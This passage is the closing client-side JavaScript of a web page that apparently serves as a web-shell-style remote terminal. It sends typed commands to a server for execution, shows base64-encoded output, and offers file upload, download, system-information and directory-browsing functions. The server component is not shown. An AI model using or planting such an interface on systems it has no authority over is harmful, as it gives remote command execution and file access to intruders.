        // ====================================================================

        // Terminal Output

        // ====================================================================

 

        function appendOutput(html) {

            const block = document.createElement('div');

            block.className = 'output-block';

            block.innerHTML = html;

            elements.outputContent.appendChild(block);

            elements.output.scrollTop = elements.output.scrollHeight;

        }

 

        function buildPromptHtml() {

            const shortPath = shortenPath(state.cwd, 35);

            return `<span class="prompt-user">${escapeHtml(config.username)}</span><span class="prompt-at">@</span><span class="prompt-host">${escapeHtml(config.hostname)}</span><span class="prompt-separator">:</span><span class="prompt-path" title="${escapeHtml(state.cwd)}">${escapeHtml(shortPath)}</span><span class="prompt-symbol">$</span>`;

        }

 

        function printCommand(cmd) {

            const html = `<div class="prompt-line">${buildPromptHtml()}<span class="cmd-text">${escapeHtml(cmd)}</span></div>`;

            appendOutput(html);

        }

 

        function printOutput(text, className = 'output-text') {

            if (!text) return;

            const html = `<div class="${className}">${escapeHtml(text)}</div>`;

            appendOutput(html);

        }

 

        function printHtml(html) {

            appendOutput(html);

        }

 

        function showLoading() {

            const html = `<div class="loading-indicator"><div class="loading-spinner"></div><span>Executing...</span></div>`;

            appendOutput(html);

            state.isLoading = true;

        }

 

        function hideLoading() {

            const loaders = elements.outputContent.querySelectorAll('.loading-indicator');

            loaders.forEach(el => el.parentElement.remove());

            state.isLoading = false;

        }

 

        function clearOutput() {

            const welcome = document.getElementById('welcome');

            elements.outputContent.innerHTML = '';

            if (welcome) {

                elements.outputContent.appendChild(welcome);

            }

        }

 

        function updatePrompt() {

            const shortPath = shortenPath(state.cwd, 25);

            elements.promptPath.textContent = shortPath;

            elements.promptPath.title = state.cwd;

            elements.cwdDisplay.textContent = state.cwd;

        }

 

        // ====================================================================

        // Command Execution

        // ====================================================================

 

        async function executeCommand(cmd) {

            if (state.isLoading) return;

 

            const trimmed = cmd.trim();

            if (!trimmed) return;

 

            // Add to history

            if (state.history[state.history.length - 1] !== trimmed) {

                state.history.push(trimmed);

            }

            state.historyIndex = state.history.length;

 

            printCommand(trimmed);

 

            // Handle built-in commands

            if (/^\s*clear\s*$/.test(trimmed)) {

                clearOutput();

                return;

            }

 

            if (/^\s*help\s*$/.test(trimmed)) {

                toggleHelp();

                return;

            }

 

            if (/^\s*sysinfo\s*$/.test(trimmed)) {

                await showSysinfo();

                return;

            }

 

            if (/^\s*upload\s+(.+)$/.test(trimmed)) {

                const match = trimmed.match(/^\s*upload\s+(.+)$/);

                await handleUpload(match[1].trim());

                return;

            }

 

            showLoading();

 

            try {

                const result = await request('shell', { cmd: trimmed, cwd: state.cwd });

                hideLoading();

 

                if (result.download) {

                    downloadFile(atob(result.name), result.content);

                    printOutput(`Downloaded: ${atob(result.name)}`, 'output-success');

                } else {

                    const stdout = atob(result.stdout || '');

                    if (stdout) {

                        printOutput(stdout);

                    }

                    state.cwd = atob(result.cwd);

                    updatePrompt();

                }

            } catch (error) {

                hideLoading();

                printOutput(`Error: ${error.message}`, 'output-error');

            }

        }

 

        async function showSysinfo() {

            showLoading();

            try {

                const result = await request('sysinfo');

                hideLoading();

 

                const info = result.info;

                let html = '<div class="output-text" style="color: var(--purple-accent); font-weight: 600; margin-bottom: 8px;">System Information</div>';

                html += '<div class="output-text">';

                for (const [key, value] of Object.entries(info)) {

                    const label = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());

                    html += `<div style="display: flex; gap: 16px; margin-bottom: 4px;">`;

                    html += `<span style="color: var(--text-dim); min-width: 140px;">${escapeHtml(label)}:</span>`;

                    html += `<span style="color: var(--text-bright);">${escapeHtml(String(value))}</span>`;

                    html += `</div>`;

                }

                html += '</div>';

                printHtml(html);

            } catch (error) {

                hideLoading();

                printOutput(`Error: ${error.message}`, 'output-error');

            }

        }

 

        // ====================================================================

        // File Operations

        // ====================================================================

 

        function downloadFile(name, base64Content) {

            const link = document.createElement('a');

            link.href = 'data:application/octet-stream;base64,' + base64Content;

            link.download = name;

            document.body.appendChild(link);

            link.click();

            document.body.removeChild(link);

        }

 

        async function handleUpload(filename) {

            return new Promise((resolve) => {

                const input = document.createElement('input');

                input.type = 'file';

                input.style.display = 'none';

                document.body.appendChild(input);

 

                input.addEventListener('change', async () => {

                    if (input.files.length === 0) {

                        document.body.removeChild(input);

                        resolve();

                        return;

                    }

 

                    const file = input.files[0];

                    const reader = new FileReader();

 

                    reader.onload = async () => {

                        const base64 = reader.result.split(',')[1];

                        showLoading();

 

                        try {

                            const result = await request('upload', {

                                filename: filename,

                                content: base64,

                                cwd: state.cwd

                            });

                            hideLoading();

                            printOutput(atob(result.stdout), result.error ? 'output-error' : 'output-success');

                        } catch (error) {

                            hideLoading();

                            printOutput(`Upload failed: ${error.message}`, 'output-error');

                        }

 

                        document.body.removeChild(input);

                        resolve();

                    };

 

                    reader.onerror = () => {

                        printOutput('Failed to read file', 'output-error');

                        document.body.removeChild(input);

                        resolve();

                    };

 

                    reader.readAsDataURL(file);

                });

 

                input.click();

            });

        }

 

        // ====================================================================

        // Tab Completion

        // ====================================================================

 

        async function handleTabCompletion() {

            const value = elements.cmdInput.value;

            if (!value.trim()) return;

 

            const parts = value.split(/\s+/);

            const isCommand = parts.length === 1;

            const input = parts[parts.length - 1];

 

            try {

                const result = await request('hint', {

                    input: input,

                    cwd: state.cwd,

                    type: isCommand ? 'cmd' : 'file'

                });

 

                const hints = (result.hints || []).map(h => atob(h)).filter(h => h);

 

                if (hints.length === 0) return;

 

                if (hints.length === 1) {

                    if (isCommand) {

                        elements.cmdInput.value = hints[0] + ' ';

                    } else {

                        parts[parts.length - 1] = hints[0];

                        elements.cmdInput.value = parts.join(' ');

                    }

                } else {

                    // Show all hints

                    printCommand(value);

                    printOutput(hints.join('  '));

                }

            } catch (error) {

                // Silently fail

            }

        }

 

        // ====================================================================

        // History Navigation

        // ====================================================================

 

        function historyUp() {

            if (state.history.length === 0) return;

 

            if (state.historyIndex > 0) {

                state.historyIndex--;

            }

 

            elements.cmdInput.value = state.history[state.historyIndex] || '';

 

            // Move cursor to end

            setTimeout(() => {

                elements.cmdInput.selectionStart = elements.cmdInput.selectionEnd = elements.cmdInput.value.length;

            }, 0);

        }

 

        function historyDown() {

            if (state.historyIndex < state.history.length - 1) {

                state.historyIndex++;

                elements.cmdInput.value = state.history[state.historyIndex];

            } else {

                state.historyIndex = state.history.length;

                elements.cmdInput.value = '';

            }

 

            setTimeout(() => {

                elements.cmdInput.selectionStart = elements.cmdInput.selectionEnd = elements.cmdInput.value.length;

            }, 0);

        }

 

        // ====================================================================

        // Help Overlay

        // ====================================================================

 

        function toggleHelp() {

            elements.helpOverlay.classList.toggle('visible');

            if (!elements.helpOverlay.classList.contains('visible')) {

                elements.cmdInput.focus();

            }

        }

 

        // ====================================================================

        // File Browser

        // ====================================================================

 

        async function openBrowser() {

            state.browserPath = state.cwd;

            state.browserSelectedIndex = 0;

            await loadBrowserDirectory();

            elements.browserOverlay.classList.add('visible');

        }

 

        function closeBrowser() {

            elements.browserOverlay.classList.remove('visible');

            elements.cmdInput.focus();

        }

 

        async function loadBrowserDirectory() {

            try {

                const result = await request('ls', { cwd: state.browserPath });

 

                if (result.error) {

                    return;

                }

 

                state.browserItems = result.items || [];

                state.browserPath = result.path;

                state.browserSelectedIndex = 0;

 

                renderBrowser();

            } catch (error) {

                // Silently fail

            }

        }

 

        function renderBrowser() {

            elements.browserPath.textContent = state.browserPath;

            elements.browserList.innerHTML = '';

 

            // Sort: directories first, then files

            const sorted = [...state.browserItems].sort((a, b) => {

                if (a.isDir !== b.isDir) return b.isDir - a.isDir;

                return a.name.localeCompare(b.name);

            });

 

            sorted.forEach((item, index) => {

                const el = document.createElement('button');

                el.className = 'browser-item';

                if (item.isDir) el.classList.add('is-dir');

                if (item.isLink) el.classList.add('is-link');

                if (!item.isDir && item.executable) el.classList.add('is-exec');

                if (index === state.browserSelectedIndex) el.classList.add('selected');

 

                let icon = '??';

                if (item.isDir) icon = '??';

                else if (item.isLink) icon = '??';

                else if (item.executable) icon = '??';

 

                el.innerHTML = `

                    <span class="browser-icon">${icon}</span>

                    <span class="browser-name">${escapeHtml(item.name)}</span>

                    <span class="browser-size">${item.isDir ? '-' : formatBytes(item.size)}</span>

                    <span class="browser-perms">${item.perms}</span>

                `;

 

                el.addEventListener('click', () => handleBrowserClick(item, index));

                el.addEventListener('dblclick', () => handleBrowserDoubleClick(item));

 

                elements.browserList.appendChild(el);

            });

        }

 

        function handleBrowserClick(item, index) {

            state.browserSelectedIndex = index;

            renderBrowser();

        }

 

        async function handleBrowserDoubleClick(item) {

            if (item.isDir) {

                if (item.name === '..') {

                    const parts = state.browserPath.split('/').filter(Boolean);

                    parts.pop();

                    state.browserPath = '/' + parts.join('/');

                } else {

                    state.browserPath = state.browserPath.replace(/\/$/, '') + '/' + item.name;

                }

                await loadBrowserDirectory();

            }

        }

 

        function browserNavigate(direction) {

            const sorted = [...state.browserItems].sort((a, b) => {

                if (a.isDir !== b.isDir) return b.isDir - a.isDir;

                return a.name.localeCompare(b.name);

            });

 

            if (direction === 'up' && state.browserSelectedIndex > 0) {

                state.browserSelectedIndex--;

            } else if (direction === 'down' && state.browserSelectedIndex < sorted.length - 1) {

                state.browserSelectedIndex++;

            }

 

            renderBrowser();

 

            // Scroll selected into view

            const selected = elements.browserList.querySelector('.selected');

            if (selected) {

                selected.scrollIntoView({ block: 'nearest', behavior: 'smooth' });

            }

        }

 

        async function browserSelect() {

            const sorted = [...state.browserItems].sort((a, b) => {

                if (a.isDir !== b.isDir) return b.isDir - a.isDir;

                return a.name.localeCompare(b.name);

            });

 

            const item = sorted[state.browserSelectedIndex];

            if (!item) return;

 

            if (item.isDir) {

                if (item.name === '..') {

                    const parts = state.browserPath.split('/').filter(Boolean);

                    parts.pop();

                    state.browserPath = '/' + parts.join('/');

                } else {

                    state.browserPath = state.browserPath.replace(/\/$/, '') + '/' + item.name;

                }

                await loadBrowserDirectory();

            } else {

                // Insert file path into command input

                const fullPath = state.browserPath.replace(/\/$/, '') + '/' + item.name;

                elements.cmdInput.value += fullPath;

                closeBrowser();

            }

        }

 

        async function browserGoUp() {

            const parts = state.browserPath.split('/').filter(Boolean);

            if (parts.length > 0) {

                parts.pop();

                state.browserPath = '/' + parts.join('/');

                await loadBrowserDirectory();

            }

        }

 

        // ====================================================================

        // Drag & Drop Upload

        // ====================================================================

 

        function initDragDrop() {

            let dragCounter = 0;

 

            document.addEventListener('dragenter', (e) => {

                e.preventDefault();

                dragCounter++;

                elements.uploadZone.classList.add('visible');

            });

 

            document.addEventListener('dragleave', (e) => {

                e.preventDefault();

                dragCounter--;

                if (dragCounter === 0) {

                    elements.uploadZone.classList.remove('visible');

                }

            });

 

            document.addEventListener('dragover', (e) => {

                e.preventDefault();

                elements.uploadBox.classList.add('dragover');

            });

 

            elements.uploadBox.addEventListener('dragleave', () => {

                elements.uploadBox.classList.remove('dragover');

            });

 

            document.addEventListener('drop', async (e) => {

                e.preventDefault();

                dragCounter = 0;

                elements.uploadZone.classList.remove('visible');

                elements.uploadBox.classList.remove('dragover');

 

                const files = e.dataTransfer.files;

                if (files.length === 0) return;

 

                for (const file of files) {

                    const reader = new FileReader();

                    reader.onload = async () => {

                        const base64 = reader.result.split(',')[1];

                        printCommand(`upload ${file.name}`);

                        showLoading();

 

                        try {

                            const result = await request('upload', {

                                filename: file.name,

                                content: base64,

                                cwd: state.cwd

                            });

                            hideLoading();

                            printOutput(atob(result.stdout), 'output-success');

                        } catch (error) {

                            hideLoading();

                            printOutput(`Upload failed: ${error.message}`, 'output-error');

                        }

                    };

                    reader.readAsDataURL(file);

                }

            });

        }

 

        // ====================================================================

        // Event Handlers

        // ====================================================================

 

        function initEventHandlers() {

            // Command input

            elements.cmdInput.addEventListener('keydown', async (e) => {

                switch (e.key) {

                    case 'Enter':

                        e.preventDefault();

                        const cmd = elements.cmdInput.value;

                        elements.cmdInput.value = '';

                        await executeCommand(cmd);

                        break;

 

                    case 'ArrowUp':

                        e.preventDefault();

                        historyUp();

                        break;

 

                    case 'ArrowDown':

                        e.preventDefault();

                        historyDown();

                        break;

 

                    case 'Tab':

                        e.preventDefault();

                        await handleTabCompletion();

                        break;

 

                    case 'l':

                        if (e.ctrlKey) {

                            e.preventDefault();

                            clearOutput();

                        }

                        break;

 

                    case 'c':

                        if (e.ctrlKey) {

                            e.preventDefault();

                            elements.cmdInput.value = '';

                            printCommand('^C');

                        }

                        break;

                }

            });

 

            // Global keyboard

            document.addEventListener('keydown', async (e) => {

                // Help toggle

                if (e.key === 'F1') {

                    e.preventDefault();

                    toggleHelp();

                    return;

                }

 

                // File browser toggle

                if (e.key === 'F2') {

                    e.preventDefault();

                    if (elements.browserOverlay.classList.contains('visible')) {

                        closeBrowser();

                    } else {

                        await openBrowser();

                    }

                    return;

                }

 

                // Escape closes overlays

                if (e.key === 'Escape') {

                    if (elements.helpOverlay.classList.contains('visible')) {

                        elements.helpOverlay.classList.remove('visible');

                        elements.cmdInput.focus();

                        return;

                    }

                    if (elements.browserOverlay.classList.contains('visible')) {

                        closeBrowser();

                        return;

                    }

                    if (elements.uploadZone.classList.contains('visible')) {

                        elements.uploadZone.classList.remove('visible');

                        return;

                    }

                    elements.contextMenu.classList.remove('visible');

                }

 

                // Browser navigation

                if (elements.browserOverlay.classList.contains('visible')) {

                    if (e.key === 'ArrowUp') {

                        e.preventDefault();

                        browserNavigate('up');

                    } else if (e.key === 'ArrowDown') {

                        e.preventDefault();

                        browserNavigate('down');

                    } else if (e.key === 'Enter') {

                        e.preventDefault();

                        await browserSelect();

                    } else if (e.key === 'Backspace') {

                        e.preventDefault();

                        await browserGoUp();

                    }

                }

            });

 

            // Click to focus input

            document.addEventListener('click', (e) => {

                const selection = window.getSelection();

                if (selection.toString()) return;

 

                if (!elements.helpOverlay.classList.contains('visible') &&

                    !elements.browserOverlay.classList.contains('visible') &&

                    !elements.contextMenu.classList.contains('visible')) {

                    elements.cmdInput.focus();

                }

            });

 

            // Help toggle button

            elements.helpToggle.addEventListener('click', (e) => {

                e.stopPropagation();

                toggleHelp();

            });

 

            // Browser close button

            elements.browserClose.addEventListener('click', closeBrowser);

 

            // Close context menu on click outside

            document.addEventListener('click', () => {

                elements.contextMenu.classList.remove('visible');

            });

        }

 

        // ====================================================================

        // Initialization

        // ====================================================================

 

        function init() {

            initEventHandlers();

            initDragDrop();

            updatePrompt();

            elements.cmdInput.focus();

        }

 

        // Start

        if (document.readyState === 'loading') {

            document.addEventListener('DOMContentLoaded', init);

        } else {

            init();

        }

    })();

    </script>

</body>

</html>